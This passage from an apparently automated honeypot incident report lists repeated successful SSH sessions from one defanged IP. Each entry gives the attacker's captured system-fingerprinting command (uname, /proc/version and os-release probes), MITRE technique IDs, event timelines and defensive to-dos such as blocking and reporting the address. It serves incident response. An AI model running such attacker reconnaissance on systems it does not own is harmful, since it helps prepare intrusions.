| `2026-08-26 19:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc29644bbd78

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:50 |
| **Last Seen** | 2026-08-26 19:50 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:50:11` | `cowrie.session.connect` |
| `2026-08-26 19:50:13` | `cowrie.client.version` |
| `2026-08-26 19:50:13` | `cowrie.client.kex` |
| `2026-08-26 19:50:20` | `cowrie.login.success` |
| `2026-08-26 19:50:22` | `cowrie.session.params` |
| `2026-08-26 19:50:22` | `cowrie.command.input` |
| `2026-08-26 19:50:22` | `cowrie.command.input` |
| `2026-08-26 19:50:22` | `cowrie.command.input` |
| `2026-08-26 19:50:22` | `cowrie.command.input` |
| `2026-08-26 19:50:22` | `cowrie.command.input` |
| `2026-08-26 19:50:22` | `cowrie.command.success` |
| `2026-08-26 19:50:22` | `cowrie.command.input` |
| `2026-08-26 19:50:22` | `cowrie.command.input` |
| `2026-08-26 19:50:22` | `cowrie.command.input` |
| `2026-08-26 19:50:22` | `cowrie.command.input` |
| `2026-08-26 19:50:23` | `cowrie.log.closed` |
| `2026-08-26 19:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-009f243c1312

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:52 |
| **Last Seen** | 2026-08-26 19:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:52:00` | `cowrie.session.connect` |
| `2026-08-26 19:52:01` | `cowrie.client.version` |
| `2026-08-26 19:52:01` | `cowrie.client.kex` |
| `2026-08-26 19:52:08` | `cowrie.login.success` |
| `2026-08-26 19:52:10` | `cowrie.session.params` |
| `2026-08-26 19:52:10` | `cowrie.command.input` |
| `2026-08-26 19:52:10` | `cowrie.command.input` |
| `2026-08-26 19:52:10` | `cowrie.command.input` |
| `2026-08-26 19:52:10` | `cowrie.command.input` |
| `2026-08-26 19:52:10` | `cowrie.command.input` |
| `2026-08-26 19:52:10` | `cowrie.command.success` |
| `2026-08-26 19:52:10` | `cowrie.command.input` |
| `2026-08-26 19:52:10` | `cowrie.command.input` |
| `2026-08-26 19:52:10` | `cowrie.command.input` |
| `2026-08-26 19:52:10` | `cowrie.command.input` |
| `2026-08-26 19:52:10` | `cowrie.log.closed` |
| `2026-08-26 19:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-056afc49baf5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:53 |
| **Last Seen** | 2026-08-26 19:53 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:53:40` | `cowrie.session.connect` |
| `2026-08-26 19:53:41` | `cowrie.client.version` |
| `2026-08-26 19:53:41` | `cowrie.client.kex` |
| `2026-08-26 19:53:48` | `cowrie.login.success` |
| `2026-08-26 19:53:51` | `cowrie.session.params` |
| `2026-08-26 19:53:51` | `cowrie.command.input` |
| `2026-08-26 19:53:51` | `cowrie.command.input` |
| `2026-08-26 19:53:51` | `cowrie.command.input` |
| `2026-08-26 19:53:51` | `cowrie.command.input` |
| `2026-08-26 19:53:51` | `cowrie.command.input` |
| `2026-08-26 19:53:51` | `cowrie.command.success` |
| `2026-08-26 19:53:51` | `cowrie.command.input` |
| `2026-08-26 19:53:51` | `cowrie.command.input` |
| `2026-08-26 19:53:51` | `cowrie.command.input` |
| `2026-08-26 19:53:51` | `cowrie.command.input` |
| `2026-08-26 19:53:53` | `cowrie.log.closed` |
| `2026-08-26 19:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-357ac3b0f5bb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:55 |
| **Last Seen** | 2026-08-26 19:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:55:27` | `cowrie.session.connect` |
| `2026-08-26 19:55:27` | `cowrie.client.version` |
| `2026-08-26 19:55:27` | `cowrie.client.kex` |
| `2026-08-26 19:55:31` | `cowrie.login.success` |
| `2026-08-26 19:55:32` | `cowrie.session.params` |
| `2026-08-26 19:55:32` | `cowrie.command.input` |
| `2026-08-26 19:55:32` | `cowrie.command.input` |
| `2026-08-26 19:55:32` | `cowrie.command.input` |
| `2026-08-26 19:55:32` | `cowrie.command.input` |
| `2026-08-26 19:55:32` | `cowrie.command.input` |
| `2026-08-26 19:55:32` | `cowrie.command.success` |
| `2026-08-26 19:55:32` | `cowrie.command.input` |
| `2026-08-26 19:55:32` | `cowrie.command.input` |
| `2026-08-26 19:55:32` | `cowrie.command.input` |
| `2026-08-26 19:55:32` | `cowrie.command.input` |
| `2026-08-26 19:55:33` | `cowrie.log.closed` |
| `2026-08-26 19:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-398e750d6514

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:56 |
| **Last Seen** | 2026-08-26 19:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:56:56` | `cowrie.session.connect` |
| `2026-08-26 19:56:57` | `cowrie.client.version` |
| `2026-08-26 19:56:57` | `cowrie.client.kex` |
| `2026-08-26 19:57:00` | `cowrie.login.success` |
| `2026-08-26 19:57:02` | `cowrie.session.params` |
| `2026-08-26 19:57:02` | `cowrie.command.input` |
| `2026-08-26 19:57:02` | `cowrie.command.input` |
| `2026-08-26 19:57:02` | `cowrie.command.input` |
| `2026-08-26 19:57:02` | `cowrie.command.input` |
| `2026-08-26 19:57:02` | `cowrie.command.input` |
| `2026-08-26 19:57:02` | `cowrie.command.success` |
| `2026-08-26 19:57:02` | `cowrie.command.input` |
| `2026-08-26 19:57:02` | `cowrie.command.input` |
| `2026-08-26 19:57:02` | `cowrie.command.input` |
| `2026-08-26 19:57:02` | `cowrie.command.input` |
| `2026-08-26 19:57:04` | `cowrie.log.closed` |
| `2026-08-26 19:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b82e721f020

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 19:59 |
| **Last Seen** | 2026-08-26 19:59 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 19:59:06` | `cowrie.session.connect` |
| `2026-08-26 19:59:07` | `cowrie.client.version` |
| `2026-08-26 19:59:07` | `cowrie.client.kex` |
| `2026-08-26 19:59:20` | `cowrie.login.success` |
| `2026-08-26 19:59:23` | `cowrie.session.params` |
| `2026-08-26 19:59:23` | `cowrie.command.input` |
| `2026-08-26 19:59:23` | `cowrie.command.input` |
| `2026-08-26 19:59:23` | `cowrie.command.input` |
| `2026-08-26 19:59:23` | `cowrie.command.input` |
| `2026-08-26 19:59:23` | `cowrie.command.input` |
| `2026-08-26 19:59:23` | `cowrie.command.success` |
| `2026-08-26 19:59:23` | `cowrie.command.input` |
| `2026-08-26 19:59:23` | `cowrie.command.input` |
| `2026-08-26 19:59:23` | `cowrie.command.input` |
| `2026-08-26 19:59:23` | `cowrie.command.input` |
| `2026-08-26 19:59:24` | `cowrie.log.closed` |
| `2026-08-26 19:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ac31da0db86

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 20:00 |
| **Last Seen** | 2026-08-26 20:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 20:00:36` | `cowrie.session.connect` |
| `2026-08-26 20:00:38` | `cowrie.client.version` |
| `2026-08-26 20:00:38` | `cowrie.client.kex` |
| `2026-08-26 20:00:41` | `cowrie.login.success` |
| `2026-08-26 20:00:45` | `cowrie.session.params` |
| `2026-08-26 20:00:45` | `cowrie.command.input` |
| `2026-08-26 20:00:45` | `cowrie.command.input` |
| `2026-08-26 20:00:45` | `cowrie.command.input` |
| `2026-08-26 20:00:45` | `cowrie.command.input` |
| `2026-08-26 20:00:45` | `cowrie.command.input` |
| `2026-08-26 20:00:45` | `cowrie.command.success` |
| `2026-08-26 20:00:45` | `cowrie.command.input` |
| `2026-08-26 20:00:45` | `cowrie.command.input` |
| `2026-08-26 20:00:45` | `cowrie.command.input` |
| `2026-08-26 20:00:45` | `cowrie.command.input` |
| `2026-08-26 20:00:45` | `cowrie.log.closed` |
| `2026-08-26 20:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45a4838ff4b8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 20:02 |
| **Last Seen** | 2026-08-26 20:02 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 20:02:29` | `cowrie.session.connect` |
| `2026-08-26 20:02:30` | `cowrie.client.version` |
| `2026-08-26 20:02:30` | `cowrie.client.kex` |
| `2026-08-26 20:02:36` | `cowrie.login.success` |
| `2026-08-26 20:02:39` | `cowrie.session.params` |
| `2026-08-26 20:02:39` | `cowrie.command.input` |
| `2026-08-26 20:02:39` | `cowrie.command.input` |
| `2026-08-26 20:02:39` | `cowrie.command.input` |
| `2026-08-26 20:02:39` | `cowrie.command.input` |
| `2026-08-26 20:02:39` | `cowrie.command.input` |
| `2026-08-26 20:02:39` | `cowrie.command.success` |
| `2026-08-26 20:02:39` | `cowrie.command.input` |
| `2026-08-26 20:02:39` | `cowrie.command.input` |
| `2026-08-26 20:02:39` | `cowrie.command.input` |
| `2026-08-26 20:02:39` | `cowrie.command.input` |
| `2026-08-26 20:02:40` | `cowrie.log.closed` |
| `2026-08-26 20:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d94418fd69

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 20:04 |
| **Last Seen** | 2026-08-26 20:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 20:04:37` | `cowrie.session.connect` |
| `2026-08-26 20:04:38` | `cowrie.client.version` |
| `2026-08-26 20:04:38` | `cowrie.client.kex` |
| `2026-08-26 20:04:43` | `cowrie.login.success` |
| `2026-08-26 20:04:45` | `cowrie.session.params` |
| `2026-08-26 20:04:45` | `cowrie.command.input` |
| `2026-08-26 20:04:45` | `cowrie.command.input` |
| `2026-08-26 20:04:45` | `cowrie.command.input` |
| `2026-08-26 20:04:45` | `cowrie.command.input` |
| `2026-08-26 20:04:45` | `cowrie.command.input` |
| `2026-08-26 20:04:45` | `cowrie.command.success` |
| `2026-08-26 20:04:45` | `cowrie.command.input` |
| `2026-08-26 20:04:45` | `cowrie.command.input` |
| `2026-08-26 20:04:45` | `cowrie.command.input` |
| `2026-08-26 20:04:45` | `cowrie.command.input` |
| `2026-08-26 20:04:46` | `cowrie.log.closed` |
| `2026-08-26 20:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26a5c090c5b0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 20:06 |
| **Last Seen** | 2026-08-26 20:07 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 20:06:42` | `cowrie.session.connect` |
| `2026-08-26 20:06:43` | `cowrie.client.version` |
| `2026-08-26 20:06:47` | `cowrie.client.kex` |
| `2026-08-26 20:06:50` | `cowrie.login.success` |
| `2026-08-26 20:06:53` | `cowrie.session.params` |
| `2026-08-26 20:06:53` | `cowrie.command.input` |
| `2026-08-26 20:06:53` | `cowrie.command.input` |
| `2026-08-26 20:06:53` | `cowrie.command.input` |
| `2026-08-26 20:06:53` | `cowrie.command.input` |
| `2026-08-26 20:06:53` | `cowrie.command.input` |
| `2026-08-26 20:06:53` | `cowrie.command.success` |
| `2026-08-26 20:06:53` | `cowrie.command.input` |
| `2026-08-26 20:06:53` | `cowrie.command.input` |
| `2026-08-26 20:06:53` | `cowrie.command.input` |
| `2026-08-26 20:06:53` | `cowrie.command.input` |
| `2026-08-26 20:06:58` | `cowrie.log.closed` |
| `2026-08-26 20:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b35bb93f5eb1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 20:08 |
| **Last Seen** | 2026-08-26 20:08 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 20:08:46` | `cowrie.session.connect` |
| `2026-08-26 20:08:47` | `cowrie.client.version` |
| `2026-08-26 20:08:47` | `cowrie.client.kex` |
| `2026-08-26 20:08:51` | `cowrie.login.success` |
| `2026-08-26 20:08:54` | `cowrie.session.params` |
| `2026-08-26 20:08:54` | `cowrie.command.input` |
| `2026-08-26 20:08:54` | `cowrie.command.input` |
| `2026-08-26 20:08:54` | `cowrie.command.input` |
| `2026-08-26 20:08:54` | `cowrie.command.input` |
| `2026-08-26 20:08:54` | `cowrie.command.input` |
| `2026-08-26 20:08:54` | `cowrie.command.success` |
| `2026-08-26 20:08:54` | `cowrie.command.input` |
| `2026-08-26 20:08:54` | `cowrie.command.input` |
| `2026-08-26 20:08:54` | `cowrie.command.input` |
| `2026-08-26 20:08:54` | `cowrie.command.input` |
| `2026-08-26 20:08:55` | `cowrie.log.closed` |
| `2026-08-26 20:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e900d895052

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-26 20:10 |
| **Last Seen** | 2026-08-26 20:10 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 20:10:36` | `cowrie.session.connect` |
| `2026-08-26 20:10:37` | `cowrie.client.version` |
| `2026-08-26 20:10:37` | `cowrie.client.kex` |
| `2026-08-26 20:10:43` | `cowrie.login.success` |
| `2026-08-26 20:10:47` | `cowrie.session.params` |
| `2026-08-26 20:10:47` | `cowrie.command.input` |
| `2026-08-26 20:10:47` | `cowrie.command.input` |
| `2026-08-26 20:10:47` | `cowrie.command.input` |
| `2026-08-26 20:10:47` | `cowrie.command.input` |
| `2026-08-26 20:10:47` | `cowrie.command.input` |
| `2026-08-26 20:10:47` | `cowrie.command.success` |
| `2026-08-26 20:10:47` | `cowrie.command.input` |
| `2026-08-26 20:10:47` | `cowrie.command.input` |
| `2026-08-26 20:10:47` | `cowrie.command.input` |
| `2026-08-26 20:10:47` | `cowrie.command.input` |
| `2026-08-26 20:10:48` | `cowrie.log.closed` |
| `2026-08-26 20:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
